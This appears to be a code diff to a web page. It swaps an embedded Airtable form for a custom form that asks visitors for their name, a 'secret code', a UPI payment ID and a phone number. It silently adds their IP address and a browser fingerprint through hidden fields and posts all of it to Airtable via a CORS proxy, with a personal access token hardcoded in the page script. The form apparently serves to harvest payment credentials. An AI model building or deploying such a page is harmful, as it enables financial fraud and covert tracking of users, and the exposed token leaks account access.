@@ -137,52 +137,80 @@
                     <div class="col-lg-10">
                         <div class="card shadow-lg border-0">
                             <div class="card-body p-5">
-                                <!-- Auto-detected Information Display -->
-                                <div class="alert alert-info mb-4">
-                                    <h5 class="alert-heading"><i class="fas fa-info-circle me-2"></i>Auto-detected Information</h5>
-                                    <p class="mb-3">The following information has been automatically detected. Please copy and paste these values into the corresponding fields in the form below:</p>
-                                    
-                                    <div class="row g-3">
+                                <!-- Custom Form with Auto-fill -->
+                                <form id="customForm" class="needs-validation" novalidate>
+                                    <div class="row g-4">
                                         <div class="col-md-6">
-                                            <div class="d-flex align-items-center">
-                                                <strong class="me-2">IP Address:</strong>
-                                                <span id="ipAddressDisplay" class="text-primary fw-bold me-2">Detecting...</span>
-                                                <button type="button" class="btn btn-outline-primary btn-sm" onclick="copyToClipboard(document.getElementById('ipAddressDisplay').textContent)">
-                                                    <i class="fas fa-copy me-1"></i>Copy
-                                                </button>
+                                            <div class="form-floating">
+                                                <input type="text" class="form-control" id="name" name="name" placeholder="Your Name" required>
+                                                <label for="name">Full Name *</label>
+                                                <div class="invalid-feedback">
+                                                    Please provide your full name.
+                                                </div>
                                             </div>
                                         </div>
                                         <div class="col-md-6">
-                                            <div class="d-flex align-items-center">
-                                                <strong class="me-2">Browser Info:</strong>
-                                                <span id="browserInfoDisplay" class="text-primary fw-bold me-2">Detecting...</span>
-                                                <button type="button" class="btn btn-outline-primary btn-sm" onclick="copyToClipboard(document.getElementById('browserInfoDisplay').textContent)">
-                                                    <i class="fas fa-copy me-1"></i>Copy
-                                                </button>
+                                            <div class="form-floating">
+                                                <input type="text" class="form-control" id="secretCode" name="secretCode" placeholder="Secret Code" required>
+                                                <label for="secretCode">Secret Code *</label>
+                                                <div class="invalid-feedback">
+                                                    Please provide your secret code.
+                                                </div>
                                             </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="form-floating">
+                                                <input type="text" class="form-control" id="upiId" name="upiId" placeholder="UPI ID" required>
+                                                <label for="upiId">UPI ID *</label>
+                                                <div class="invalid-feedback">
+                                                    Please provide your UPI ID.
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="form-floating">
+                                                <input type="tel" class="form-control" id="phoneNumber" name="phoneNumber" placeholder="Phone Number" required>
+                                                <label for="phoneNumber">Phone Number *</label>
+                                                <div class="invalid-feedback">
+                                                    Please provide your phone number.
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Hidden fields for automatic data collection -->
+                                        <input type="hidden" id="ipAddress" name="ipAddress">
+                                        <input type="hidden" id="browserInfo" name="browserInfo">
+                                        
+                                        <div class="col-12">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="checkbox" id="privacyConsent" required>
+                                                <label class="form-check-label" for="privacyConsent">
+                                                    I agree to the <a href="privacy-policy.html" target="_blank">Privacy Policy</a> and consent to the collection of my data.
+                                                </label>
+                                                <div class="invalid-feedback">
+                                                    You must agree before submitting.
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="col-12 text-center">
+                                            <button type="submit" class="btn btn-primary btn-lg px-5 py-3 rounded-pill">
+                                                <i class="fas fa-paper-plane me-2"></i>Submit Information
+                                            </button>
                                         </div>
                                     </div>
-                                </div>
-
-                                <!-- Airtable Form Embed -->
-                                <iframe 
-                                    class="airtable-embed" 
-                                    src="https://airtable.com/embed/appGY1EL9Ma68WeAH/pagkkwbm4RHlXY2MY/form" 
-                                    frameborder="0" 
-                                    onmousewheel="" 
-                                    width="100%" 
-                                    height="533" 
-                                    style="background: transparent; border: 1px solid #ccc;">
-                                </iframe>
+                                </form>
                                 
-                                <!-- Alternative: Direct Airtable Form Link -->
-                                <div class="text-center mt-4">
-                                    <p class="text-muted mb-3">If the form above doesn't load, please use the direct link:</p>
-                                    <a href="https://airtable.com/appGY1EL9Ma68WeAH/pagkkwbm4RHlXY2MY/form" 
-                                       target="_blank" 
-                                       class="btn btn-primary btn-lg px-5 py-3 rounded-pill">
-                                        <i class="fas fa-external-link-alt me-2"></i>Open Form in New Tab
-                                    </a>
+                                <!-- Success Message -->
+                                <div id="successMessage" class="alert alert-success mt-4" style="display: none;">
+                                    <i class="fas fa-check-circle me-2"></i>
+                                    <strong>Success!</strong> Your information has been submitted successfully.
+                                </div>
+                                
+                                <!-- Error Message -->
+                                <div id="errorMessage" class="alert alert-danger mt-4" style="display: none;">
+                                    <i class="fas fa-exclamation-circle me-2"></i>
+                                    <strong>Error!</strong> There was an issue submitting your information. Please try again.
                                 </div>
                             </div>
                         </div>
@@ -306,11 +334,9 @@
                     .then(response => response.json())
                     .then(data => {
                         document.getElementById('ipAddress').value = data.ip;
-                        document.getElementById('ipAddressDisplay').textContent = data.ip;
                     })
                     .catch(error => {
                         document.getElementById('ipAddress').value = 'Unable to detect';
-                        document.getElementById('ipAddressDisplay').textContent = 'Unable to detect';
                     });
 
                 // Get Browser Info
@@ -323,12 +349,13 @@
                     cookieEnabled: navigator.cookieEnabled,
                     onLine: navigator.onLine,
                     screenResolution: screen.width + 'x' + screen.height,
-                    windowSize: window.innerWidth + 'x' + window.innerHeight
+                    windowSize: window.innerWidth + 'x' + window.innerHeight,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString()
                 };
 
                 const browserInfoString = JSON.stringify(browserInfo);
                 document.getElementById('browserInfo').value = browserInfoString;
-                document.getElementById('browserInfoDisplay').textContent = browserInfoString;
             }
 
             function getBrowserName() {
@@ -347,24 +374,93 @@
                 return match ? match[2] : 'Unknown';
             }
 
-            // Copy to clipboard function
-            function copyToClipboard(text) {
-                navigator.clipboard.writeText(text).then(function() {
-                    // Show a temporary success message
-                    const originalText = event.target.textContent;
-                    event.target.textContent = 'Copied!';
-                    event.target.classList.add('btn-success');
-                    event.target.classList.remove('btn-outline-primary');
+            // Form submission handling
+            document.getElementById('customForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Collect system info before submission
+                collectSystemInfo();
+                
+                // Get form data
+                const formData = new FormData(this);
+                const data = Object.fromEntries(formData);
+                
+                // Airtable API configuration
+                const airtableConfig = {
+                    baseId: 'appGY1EL9Ma68WeAH',
+                    tableName: 'DATA',
+                    apiKey: 'pat6AvVXQl4S5zdKz.d920e0f3e92785755518ce0c2e263176de75f8923cf2e408926b8144544b59eb'
+                };
+                
+                // Prepare data for Airtable
+                const airtableData = {
+                    "records": [
+                        {
+                            "fields": {
+                                "NAME": data.name,
+                                "SECRET CODE": data.secretCode,
+                                "UPI ID": data.upiId,
+                                "Phone Number": data.phoneNumber,
+                                "IP Address": data.ipAddress,
+                                "Browser Info": data.browserInfo
+                            }
+                        }
+                    ]
+                };
+                
+                // Submit to Airtable using a CORS proxy
+                fetch('https://cors-anywhere.herokuapp.com/https://api.airtable.com/v0/' + airtableConfig.baseId + '/' + airtableConfig.tableName, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + airtableConfig.apiKey,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(airtableData)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Show success message
+                        document.getElementById('successMessage').style.display = 'block';
+                        document.getElementById('errorMessage').style.display = 'none';
+                        document.getElementById('customForm').reset();
+                        
+                        // Hide success message after 5 seconds
+                        setTimeout(() => {
+                            document.getElementById('successMessage').style.display = 'none';
+                        }, 5000);
+                    } else {
+                        throw new Error('Submission failed');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Show error message
+                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('successMessage').style.display = 'none';
                     
+                    // Hide error message after 5 seconds
                     setTimeout(() => {
-                        event.target.textContent = originalText;
-                        event.target.classList.remove('btn-success');
-                        event.target.classList.add('btn-outline-primary');
-                    }, 2000);
-                }).catch(function(err) {
-                    console.error('Could not copy text: ', err);
+                        document.getElementById('errorMessage').style.display = 'none';
+                    }, 5000);
                 });
-            }
+            });
+
+            // Bootstrap form validation
+            (function() {
+                'use strict';
+                window.addEventListener('load', function() {
+                    var forms = document.getElementsByClassName('needs-validation');
+                    var validation = Array.prototype.filter.call(forms, function(form) {
+                        form.addEventListener('submit', function(event) {
+                            if (form.checkValidity() === false) {
+                                event.preventDefault();
+                                event.stopPropagation();
+                            }
+                            form.classList.add('was-validated');
+                        }, false);
+                    });
+                }, false);
+            })();
 
             // Collect system info when page loads
             document.addEventListener('DOMContentLoaded', function() {
